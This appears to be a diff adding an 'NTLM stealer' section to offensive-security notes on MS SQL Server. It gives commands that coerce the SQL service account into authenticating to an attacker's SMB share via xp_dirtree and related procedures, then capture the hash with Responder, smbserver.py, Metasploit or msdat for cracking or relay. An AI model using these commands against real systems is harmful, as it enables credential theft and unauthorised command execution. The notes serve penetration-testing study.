@@ -150,3 +150,52 @@ tasks above to deploy a payload, such as a reverse `meterpreter`, on the server
 through the MS SQL service.
 
 ### NTLM stealer
+
+The (undocumented) `xp_dirtree`, `xp_fileexist` and `xp_getfiledetails` SQL
+stored procedures can be used to access files on remote systems over `SMB`.
+The account running the SQL service, be it a local or domain joined account,
+will authenticate to the `SMB` share by completing a `Net-NTLMv1` or
+`Net-NTLMv2` challenge.
+
+This response can be offline cracked to retrieve the password of the SQL
+service account. The authentication challenge can also be relayed in order
+to directly execute commands as the account running the SQL service through the
+`SMB` service of a targeted server. The targeted server must expose a `SMB`
+service that does not require message signing and the SQL service account must
+have local administrator privileges on the server. For more information on how
+to conduct this attack, refer to the `Active Directory - NTLM Relaying` note.   
+
+Depending on the permissions configured to use the procedures, a non privileged
+user may be able to execute them. Usually, the account connecting to the
+database should only require the `PUBLIC` role to execute the procedures.
+
+To capture the `Net-NTLM` response, a `SMB` share service or `Responder` must
+be started:
+
+```
+smbserver.py -smb2support <SHARE_NAME> /tmp
+
+Responder.py -I <INTERFACE>
+```
+
+Then, from a connected SQL interpreter, the methods can be used to make a
+connection to the `SMB` service:
+
+```
+# METHOD = xp_dirtree / xp_fileexist / xp_getfiledetails
+<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
+exec <METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
+exec <METHOD> '\\<HOSTNAME | IP>\Whatever_Share',1,1;
+exec master.dbo.<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
+```
+
+The `metasploit` module `auxiliary/admin/mssql/mssql_ntlm_stealer` and the
+`msdat` `Python` script can be used to try the three methods above
+automatically:
+
+```
+# Only tries xp_dirtree and xp_fileexist
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
+
+msdat smbauthcapture -v -s <RHOST> -p <RPORT> -D <DB_NAME> -U <USERNAME> -P '<PASSWORD>' --capture <LHOST_SMB_SERVER>
+```
